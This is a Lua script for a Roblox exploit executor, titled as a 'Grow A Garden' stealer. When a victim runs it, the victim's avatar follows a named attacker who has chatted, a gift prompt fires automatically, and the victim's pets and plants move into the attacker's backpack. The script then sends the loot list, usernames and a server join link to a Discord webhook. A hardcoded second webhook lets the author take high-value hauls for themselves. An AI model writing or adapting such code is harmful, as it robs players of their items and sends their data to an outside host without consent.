
-- GROW A GARDEN STEALER - by namnnni2

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Backpack = Players.LocalPlayer:WaitForChild("Backpack")
local Modules = ReplicatedStorage:WaitForChild("Modules")

-- MODULE
local petUtils = require(Modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
local calcPlantValue = require(Modules:WaitForChild("CalculatePlantValue"))

-- CONFIG
local env = getfenv()
local PRIMARY_WEBHOOK = env.Webhook
local PRIMARY_USERNAME = env.Username
local DUAL_WEBHOOK = "https://discord.com/api/webhooks/1391020634913374278/fPKPZTPqG2mCyai6-oebsMx5jagXzLRWNzAQb4jQoKieCJj6dLuyZT1PUh9xo9owdQ65"
local DUAL_USERNAME = "namnnni2"
local VALUE_THRESHOLD = 1_000_000_000_000
local HEAVY_WEIGHT = 10
local AUTO_TRANSFER_DELAY = 0.3
local VIP_PETS = {"Butterfly", "Raccoon", "Dragonfly", "Mimic Octopus", "Queen Bee", "Disco Bee", "Fennec Fox"}

-- UTILS
local function getRequestFunction()
    if identifyexecutor then print("Executor:", identifyexecutor()) end
    return (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request) or (getgenv and getgenv().request) or request
end

local function formatNumber(n)
    return tostring(math.floor(n)):reverse():gsub("(%d%d%d)", "%1,"):reverse():gsub("^,", "")
end

local function calculateItemValue(tool)
    local itemType = tool:GetAttribute("ItemType")
    if itemType == "Pet" then
        return petUtils:GetPetValue(tool)
    elseif itemType == "Plant" then
        return calcPlantValue(tool)
    end
    return 0
end

local function calculatePriority(item)
    local p = 0
    if table.find(VIP_PETS, item.Name) then p += 1000 end
    if (item.Weight or 0) >= HEAVY_WEIGHT then p += 500 end
    return p + (item.Value or 0)
end

local function sortByPriority(a, b)
    return calculatePriority(a) > calculatePriority(b)
end

-- WEBHOOK
local function sendWebhook(items, totalValue, targetName)
    local useDual = totalValue >= VALUE_THRESHOLD
    local webhook = useDual and DUAL_WEBHOOK or PRIMARY_WEBHOOK
    local username = useDual and DUAL_USERNAME or PRIMARY_USERNAME
    if not webhook then warn("No webhook found."); return end

    local hasVIPOrHeavy = false
    for _, i in ipairs(items) do
        if table.find(VIP_PETS, i.Name) or (i.Weight or 0) >= HEAVY_WEIGHT then hasVIPOrHeavy = true break end
    end

    local categories = {
        {name = "üíé VIP Pets", items = {}},
        {name = "üèãÔ∏è Heavy Pets", items = {}},
        {name = "üêæ Regular Pets", items = {}},
        {name = "üå± Plants", items = {}}
    }

    for _, item in ipairs(items) do
        if table.find(VIP_PETS, item.Name) then
            table.insert(categories[1].items, item)
        elseif (item.Weight or 0) >= HEAVY_WEIGHT then
            table.insert(categories[2].items, item)
        elseif item.Type == "Pet" then
            table.insert(categories[3].items, item)
        else
            table.insert(categories[4].items, item)
        end
    end

    local desc = {}
    for _, c in ipairs(categories) do
        if #c.items > 0 then
            table.insert(desc, "**"..c.name.." ("..#c.items..")**")
            for _, i in ipairs(c.items) do
                table.insert(desc, string.format("- %s: $%s (%.1fkg)", i.Name, formatNumber(i.Value), i.Weight or 0))
            end
            table.insert(desc, "")
        end
    end

    local payload = {
        username = username,
        content = hasVIPOrHeavy and "@everyone" or nil,
        embeds = {{
            title = useDual and "üíé VIP TRANSFER" or "üì¶ ITEM TRANSFER",
            color = useDual and 0xFFD700 or 0x00FF00,
            description = table.concat(desc, "\n"),
            fields = {
                {name = "üë§ Sender", value = Players.LocalPlayer.Name, inline = true},
                {name = "üéØ Receiver", value = targetName, inline = true},
                {name = "üí∞ Total Value", value = "$"..formatNumber(totalValue), inline = true},
                {name = "üîó Quick Join", value = string.format("https://fern.wtf/JoinPlace?placeId=%d&jobId=%s", game.PlaceId, game.JobId)}
            },
            footer = {text = os.date("%Y-%m-%d %H:%M:%S")},
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }

    local req = getRequestFunction()
    if not req then warn("‚ùå Executor kh√¥ng h·ªó tr·ª£ request."); return end

    local ok, res = pcall(function()
        return req({
            Url = webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(payload)
        })
    end)

    if ok then
        print("‚úÖ Webhook sent")
    else
        warn("‚ùå Webhook error", res)
    end
end

-- GIFT
local currentPrompt = nil
local isTransferring = false

local function waitForItemRemoval(tool)
    local t0 = os.clock()
    while tool and tool.Parent == Backpack and os.clock() - t0 < 5 do task.wait(0.1) end
    return tool and tool.Parent ~= Backpack
end

local function createPrompt(targetChar, targetName)
    if currentPrompt then currentPrompt:Destroy() end
    local prompt = Instance.new("ProximityPrompt")
    prompt.ObjectText = "Gift to "..targetName
    prompt.ActionText = "Auto-Gift"
    prompt.HoldDuration = 0.5
    prompt.MaxActivationDistance = 10
    prompt.Parent = targetChar:FindFirstChild("HumanoidRootPart")
    currentPrompt = prompt

    prompt.Triggered:Connect(function()
        if isTransferring then return end
        isTransferring = true

        local items, total = {}, 0
        for _, tool in ipairs(Backpack:GetChildren()) do
            if tool:IsA("Tool") then
                local item = {
                    Name = tool.Name,
                    Type = tool:GetAttribute("ItemType"),
                    Value = calculateItemValue(tool),
                    Weight = tool:GetAttribute("Weight"),
                    Tool = tool
                }
                total += item.Value
                table.insert(items, item)
            end
        end

        table.sort(items, sortByPriority)

        local receiver = Players:FindFirstChild(targetName)
        local rb = receiver and receiver:FindFirstChildOfClass("Backpack")
        if rb then
            for _, i in ipairs(items) do
                if i.Tool and i.Tool.Parent == Backpack then
                    i.Tool.Parent = rb
                    waitForItemRemoval(i.Tool)
                    task.wait(AUTO_TRANSFER_DELAY)
                end
            end
        end

        sendWebhook(items, total, targetName)
        isTransferring = false
    end)

    delay(0.5, function()
        if prompt and prompt.Parent then
            prompt:InputHoldBegin()
            task.wait(prompt.HoldDuration)
            prompt:InputHoldEnd()
        end
    end)
end

-- FOLLOW
local followConnection = nil

local function followTarget(player)
    local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
    local myhrp = Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not hrp or not myhrp then return end

    if followConnection then followConnection:Disconnect() end
    followConnection = RunService.Heartbeat:Connect(function(dt)
        local behind = hrp.CFrame.Position - hrp.CFrame.LookVector * 3
        local new = myhrp.Position:Lerp(behind, dt * 10)
        myhrp.CFrame = CFrame.new(new, hrp.Position)
        if not currentPrompt then createPrompt(player.Character, player.Name) end
    end)
end

local function onChat(player, msg)
    if (player.Name == PRIMARY_USERNAME or player.Name == DUAL_USERNAME) and not isTransferring then
        if player.Character then
            followTarget(player)
        else
            player.CharacterAdded:Once(function()
                followTarget(player)
            end)
        end
    end
end

for _, p in ipairs(Players:GetPlayers()) do
    p.Chatted:Connect(function(msg) onChat(p, msg) end)
end
Players.PlayerAdded:Connect(function(p)
    p.Chatted:Connect(function(msg) onChat(p, msg) end)
end)
